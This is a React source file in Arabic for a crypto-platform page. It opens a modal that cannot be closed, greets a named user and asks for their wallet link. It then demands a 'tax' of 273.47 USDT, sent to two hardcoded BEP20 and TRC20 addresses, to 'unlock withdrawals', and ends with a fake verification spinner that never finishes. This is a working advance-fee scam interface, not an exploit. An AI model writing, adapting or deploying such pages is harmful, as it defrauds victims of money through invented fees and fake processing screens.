
import React, { useState } from 'react';
import Header from './components/Header';
import QuickActions from './components/QuickActions';
import MenuList from './components/MenuList';
import BottomNav from './components/BottomNav';
import { Copy, CheckCircle2 } from 'lucide-react';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Mine');
  const [modalStep, setModalStep] = useState<number>(1); // 1 to 4
  const [walletAddress, setWalletAddress] = useState('');
  const [copied, setCopied] = useState<string | null>(null);

  const nextStep = () => setModalStep(prev => prev + 1);

  const copyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    setCopied(type);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div className="relative min-h-screen max-w-[430px] mx-auto bg-[#F8F8F8] overflow-x-hidden">
      {/* Main Content with conditional lighter blur */}
      <div className={`flex flex-col min-h-screen pb-20 transition-all duration-500 ${modalStep > 0 ? 'blur-sm pointer-events-none opacity-90' : ''}`}>
        <Header />
        <QuickActions />
        <div className="px-3 mt-4">
          <MenuList />
        </div>
        <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
      </div>

      {/* Modal Overlay - Interaction disabled on background to prevent exit */}
      {modalStep > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30 backdrop-blur-[1.5px] animate-in fade-in duration-300">
          <div className="bg-white w-full rounded-2xl p-6 shadow-2xl flex flex-col text-right dir-rtl animate-in zoom-in-95 duration-300" style={{ direction: 'rtl' }}>
            
            {/* Step 1: Welcome */}
            {modalStep === 1 && (
              <div className="space-y-4">
                <h3 className="text-lg font-bold text-gray-800">تنبيه</h3>
                <p className="text-gray-600 leading-relaxed">
                  اهلا بك <span className="font-bold text-red-600">alaalsaleh94</span> تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصه <span className="font-semibold italic">mini pro</span> اضغط التالي
                </p>
                <button 
                  onClick={nextStep}
                  className="w-full py-3 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
                >
                  التالي
                </button>
              </div>
            )}

            {/* Step 2: Wallet Input */}
            {modalStep === 2 && (
              <div className="space-y-4">
                <h3 className="text-lg font-bold text-gray-800">رابط المحفظة</h3>
                <p className="text-gray-600">يرجى إدخال رابط محفظتك الخاص:</p>
                <input 
                  type="text" 
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="أدخل الرابط هنا..."
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#9B4A4E] transition-all text-left"
                  style={{ direction: 'ltr' }}
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletAddress}
                  className="w-full py-3 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform disabled:opacity-50"
                >
                  التالي
                </button>
              </div>
            )}

            {/* Step 3: Deposit Info */}
            {modalStep === 3 && (
              <div className="space-y-4 overflow-y-auto max-h-[80vh] no-scrollbar">
                <h3 className="text-lg font-bold text-gray-800">تأكيد الإيداع</h3>
                <div className="text-gray-600 text-[13px] leading-relaxed space-y-3">
                  <p>
                    اهلا بك <span className="font-bold text-red-600">alaalsaleh94</span> بقي أمر إيداع مبلغ <span className="font-bold">273.47</span> عملة <span className="font-bold">USDT BEP20</span> او <span className="font-bold">Tron TRC20</span> لفتح قناة السحب.
                  </p>
                  
                  <div className="p-3 bg-blue-50 border-r-4 border-blue-500 rounded-md">
                    <p className="text-blue-800 font-semibold">
                      ملاحظة: عند دفع الضريبة، يمكنك سحب العملات بالكامل. يستغرق وصول سحب العملات إلى محفظتك من 10 إلى 30 دقيقة.
                    </p>
                  </div>

                  <p className="font-medium text-gray-700">
                    <span className="text-red-600 font-bold underline">هام جداً:</span> يجب عليك أولاً دفع الضريبة عبر العناوين الموضحة أدناه، وبعد إتمام التحويل بنجاح، يرجى الضغط على زر "تم الإيداع".
                  </p>

                  <p>
                    هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه <span className="italic">mini pro</span>.
                  </p>
                </div>
                
                <div className="space-y-3 pt-2">
                  {/* BEP20 Address */}
                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100 flex flex-col">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-5 h-5 bg-[#F3BA2F] rounded-full flex items-center justify-center">
                          <span className="text-[10px] text-white font-bold">B</span>
                        </div>
                        <span className="text-[11px] text-gray-500 font-bold uppercase">USDT BEP20 (BSC)</span>
                      </div>
                      <button 
                        onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d', 'bep20')}
                        className="text-[#9B4A4E] hover:scale-110 transition-transform"
                      >
                        {copied === 'bep20' ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
                      </button>
                    </div>
                    <p className="text-[11px] break-all font-mono text-gray-800 select-all text-left bg-white p-2 border border-gray-100 rounded" style={{ direction: 'ltr' }}>
                      0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                    </p>
                  </div>

                  {/* TRC20 Address */}
                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100 flex flex-col">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-5 h-5 bg-[#FF0013] rounded-full flex items-center justify-center">
                          <span className="text-[10px] text-white font-bold">T</span>
                        </div>
                        <span className="text-[11px] text-gray-500 font-bold uppercase">USDT TRC20 (TRON)</span>
                      </div>
                      <button 
                        onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai', 'trc20')}
                        className="text-[#9B4A4E] hover:scale-110 transition-transform"
                      >
                        {copied === 'trc20' ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
                      </button>
                    </div>
                    <p className="text-[11px] break-all font-mono text-gray-800 select-all text-left bg-white p-2 border border-gray-100 rounded" style={{ direction: 'ltr' }}>
                      TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai
                    </p>
                  </div>
                </div>

                <button 
                  onClick={nextStep}
                  className="w-full py-4 bg-green-600 text-white rounded-xl font-bold shadow-lg active:scale-95 transition-transform mt-2 text-lg"
                >
                  تم الايداع
                </button>
              </div>
            )}

            {/* Step 4: Verification */}
            {modalStep === 4 && (
              <div className="space-y-6 py-8 flex flex-col items-center text-center">
                <div className="w-16 h-16 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin mb-4"></div>
                <p className="text-xl font-bold text-gray-800 leading-relaxed">
                  الرجاء الانتظار للتأكد من عمليه الايداع
                </p>
                <p className="text-sm text-gray-500">
                  يتم الآن مراجعة المعاملة بشكل آلي، يرجى عدم إغلاق هذه الصفحة.
                </p>
              </div>
            )}

          </div>
        </div>
      )}
    </div>
  );
};

export default App;
